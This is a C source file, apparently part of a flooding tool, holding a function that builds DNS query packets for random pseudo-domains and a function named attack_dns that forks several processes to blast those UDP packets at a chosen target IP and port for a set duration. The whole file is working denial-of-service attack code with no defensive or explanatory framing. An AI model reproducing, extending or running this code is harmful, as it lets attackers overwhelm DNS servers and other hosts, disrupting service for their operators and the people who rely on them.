#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

void build_dns_query(char *buf, int *len) {
    // Random DNS query
    char domain[64];
    const char *tlds[] = {"com", "org", "net", "io", "xyz", "top", "online"};
    
    snprintf(domain, sizeof(domain), "%d.%d.%d.%d.%s",
        rand() % 255, rand() % 255, rand() % 255, rand() % 255,
        tlds[rand() % 7]);

    *len = 0;
    // Transaction ID
    buf[(*len)++] = rand() % 256;
    buf[(*len)++] = rand() % 256;
    // Flags
    buf[(*len)++] = 0x01;
    buf[(*len)++] = 0x00;
    // Questions
    buf[(*len)++] = 0x00;
    buf[(*len)++] = 0x01;
    // Answer RRs
    buf[(*len)++] = 0x00;
    buf[(*len)++] = 0x00;
    // Authority RRs
    buf[(*len)++] = 0x00;
    buf[(*len)++] = 0x00;
    // Additional RRs
    buf[(*len)++] = 0x00;
    buf[(*len)++] = 0x00;

    // Query name
    char *part = strtok(domain, ".");
    while (part != NULL) {
        int part_len = strlen(part);
        buf[(*len)++] = part_len;
        memcpy(buf + *len, part, part_len);
        *len += part_len;
        part = strtok(NULL, ".");
    }
    buf[(*len)++] = 0x00;

    // Query type (A)
    buf[(*len)++] = 0x00;
    buf[(*len)++] = 0x01;
    // Query class (IN)
    buf[(*len)++] = 0x00;
    buf[(*len)++] = 0x01;
}

void attack_dns(char *target, int port, int duration, int threads) {
    time_t end = time(NULL) + duration;

    for (int i = 0; i < threads; i++) {
        if (fork() == 0) {
            int sock = socket(AF_INET, SOCK_DGRAM, 0);
            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(port);
            inet_pton(AF_INET, target, &addr.sin_addr);

            char packet[512];
            int len;

            while (time(NULL) < end) {
                build_dns_query(packet, &len);
                sendto(sock, packet, len, 0, (struct sockaddr *)&addr, sizeof(addr));
            }
            close(sock);
            exit(0);
        }
    }
}